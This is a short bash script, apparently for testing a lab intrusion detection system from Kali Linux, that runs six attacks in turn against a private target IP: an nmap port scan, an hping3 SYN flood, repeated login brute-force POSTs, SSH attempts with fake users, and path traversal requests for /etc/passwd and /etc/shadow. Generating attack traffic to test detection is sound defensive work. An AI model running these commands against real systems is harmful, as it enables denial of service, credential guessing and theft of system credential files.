#!/bin/bash
# Standalone Kali Linux Attack Test Script
# Copy this file to Kali Linux and run: chmod +x kali-test-all.sh && ./kali-test-all.sh

IDS_IP="${1:-192.168.100.4}"

echo "=========================================="
echo "  IDS Attack Test - All 6 Types"
echo "  Target: $IDS_IP"
echo "=========================================="
echo ""

# Check connectivity
if ! ping -c 2 -W 2 $IDS_IP > /dev/null 2>&1; then
    echo "ERROR: Cannot reach $IDS_IP"
    exit 1
fi

echo "[1/6] Port Scan (Probe)..."
nmap -p 1-500 -T4 $IDS_IP > /dev/null 2>&1
sleep 5

echo "[2/6] DoS Attack..."
hping3 -S -p 5001 --flood $IDS_IP > /dev/null 2>&1 &
HPING_PID=$!
sleep 5
kill $HPING_PID 2>/dev/null
wait $HPING_PID 2>/dev/null
sleep 5

echo "[3/6] Brute Force..."
for i in {1..15}; do
    curl -s -X POST http://$IDS_IP:8080/login \
        -d "username=admin&password=wrong$i" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 2 > /dev/null 2>&1
    sleep 0.2
done
sleep 5

echo "[4/6] R2L Attack..."
for i in {1..8}; do
    ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        fakeuser$i@$IDS_IP "exit" > /dev/null 2>&1
    sleep 0.5
done
sleep 5

echo "[5/6] U2R Attack..."
curl -s "http://$IDS_IP:8080/../../etc/passwd" --max-time 2 > /dev/null 2>&1
curl -s "http://$IDS_IP:8080/../../etc/shadow" --max-time 2 > /dev/null 2>&1
sleep 5

echo "[6/6] Mixed Attack..."
nmap -p 1-200 -T4 $IDS_IP > /dev/null 2>&1 &
hping3 -S -p 5001 -c 100 $IDS_IP > /dev/null 2>&1 &
wait

echo ""
echo "=========================================="
echo "  Complete! Check Monitoring:"
echo "  http://$IDS_IP:5173"
echo "=========================================="

